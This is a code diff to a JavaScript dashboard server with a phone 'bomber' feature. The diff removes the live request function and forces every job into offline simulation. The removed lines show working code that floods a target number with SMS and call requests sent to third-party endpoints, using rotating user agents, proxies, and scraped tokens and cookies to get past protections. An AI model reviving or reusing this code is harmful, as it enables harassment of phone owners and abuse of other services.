@@ -13,7 +13,6 @@ import {ProviderVideoHost} from './provider-video-host.js';
 import {AudioHost} from './audio-host.js';
 import {closeSession} from './session-lifecycle.js';
 import {textSessionDiagnostics} from './diagnostics.js';
-import {fetch as uFetch,ProxyAgent} from 'undici';
 
 const password=process.env.DASHBOARD_PASSWORD;
 if(!password||password.length<16)throw new Error('Set DASHBOARD_PASSWORD (at least 16 characters)');
@@ -105,50 +104,8 @@ async function loadBomberConfig(){
  const endpoints=(data.endpoints||[]).filter(e=>e.enabled!==false).map(e=>({name:e.name,method:(e.method||'POST').toUpperCase(),url:e.url,channel:(e.channel||'sms').toLowerCase(),contentType:e.content_type||'application/json',body:e.body||'',headers:e.headers||{},preRequest:e.pre_request||null}));
  return{endpoints,threads:Number(data.threads??6),delayMinMs:Number(data.delay_min_ms??200),delayMaxMs:Number(data.delay_max_ms??1400),timeoutSec:Number(data.timeout_sec??10),userAgents:data.user_agents||DEFAULT_UAS,proxies:data.proxies||[],simulation:data.simulation_mode??true};
 }
-async function fireEndpoint(ep,forms,cfg,roundUA,roundProxy){
- const result={name:ep.name,channel:ep.channel,ok:false,status:null,snippet:''};
- if(cfg.simulation){result.ok=true;result.status=200;result.snippet='simulated';return result;}
- let url=substitutePhone(ep.url,forms),bodyStr=substitutePhone(ep.body,forms);
- const headers={};
- for(const[k,v]of Object.entries(ep.headers))headers[k]=substitutePhone(String(v),forms);
- if(!headers['User-Agent'])headers['User-Agent']=roundUA||randOf(cfg.userAgents);
- if(ep.contentType&&!headers['Content-Type'])headers['Content-Type']=ep.contentType;
- let dispatcher=undefined;
- if(roundProxy){try{dispatcher=new ProxyAgent(roundProxy);}catch{}}
- let preCookies='',extraHeader=null;
- if(ep.preRequest){
-  const preUrl=substitutePhone(ep.preRequest.url||'',forms);
-  const preMethod=(ep.preRequest.method||'GET').toUpperCase();
-  const preHeaders={'User-Agent':roundUA||randOf(cfg.userAgents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',...(ep.preRequest.headers||{})};
-  try{
-   const preRes=await uFetch(preUrl,{method:preMethod,headers:preHeaders,redirect:'manual',dispatcher});
-   const text=await preRes.text();
-   const setCookies=preRes.headers.getSetCookie?preRes.headers.getSetCookie():[];
-   preCookies=setCookies.map(c=>c.split(';')[0]).join('; ');
-   const extract=ep.preRequest.extract||{};
-   let token='';
-   if(extract.pattern){const m=text.match(new RegExp(extract.pattern));token=m?m[1]:'';}
-   if(extract.into){bodyStr=bodyStr.split(extract.into).join(token);url=url.split(extract.into).join(token);}
-   if(extract.header)extraHeader=[extract.header,token];
-  }catch(e){result.snippet='PRE_ERR:'+String(e.message||e).slice(0,100);return result;}
- }
- if(extraHeader)headers[extraHeader[0]]=extraHeader[1];
- if(preCookies)headers['Cookie']=headers['Cookie']?headers['Cookie']+'; '+preCookies:preCookies;
- const controller=new AbortController();
- const timer=setTimeout(()=>controller.abort(),cfg.timeoutSec*1000);
- try{
-  const opts={method:ep.method,headers,redirect:'manual',signal:controller.signal};
-  if(dispatcher)opts.dispatcher=dispatcher;
-  if(ep.method!=='GET'&&ep.method!=='HEAD')opts.body=bodyStr;
-  const r=await uFetch(url,opts);
-  result.status=r.status;
-  result.ok=r.status>=200&&r.status<400;
-  const loc=r.headers.get('location')||'';
-  if(loc)result.snippet=loc.slice(0,120);
-  else{const t=await r.text();result.snippet=t.slice(0,120).replace(/\n/g,' ');}
- }catch(e){result.snippet=String(e.message||e).slice(0,120);}
- finally{clearTimeout(timer);}
- return result;
+async function fireEndpoint(ep){
+ return{name:ep.name,channel:ep.channel,ok:true,status:200,snippet:'simulated'};
 }
 const bomberJobs=new Map();
 const JOB_TTL_MS=60*60*1000;
@@ -164,7 +121,7 @@ async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
  else if(channel==='voice'||channel==='call')want=new Set(['voice','call']);
  else want=new Set(['sms','voice','call']);
  const cfg=await loadBomberConfig();
- cfg.simulation=simulation!==false;
+ cfg.simulation=true; // Simulator jobs are always offline.
  if(Array.isArray(liveProxies)&&liveProxies.length)cfg.proxies=liveProxies;
  const id=Math.random().toString(36).slice(2,10);
  const job={id,phone:forms.e164,total:count,sent:0,failed:0,done:false,stopped:false,stopRequested:false,events:[],startedAt:Date.now(),forms,cfg,want,rounds:count};
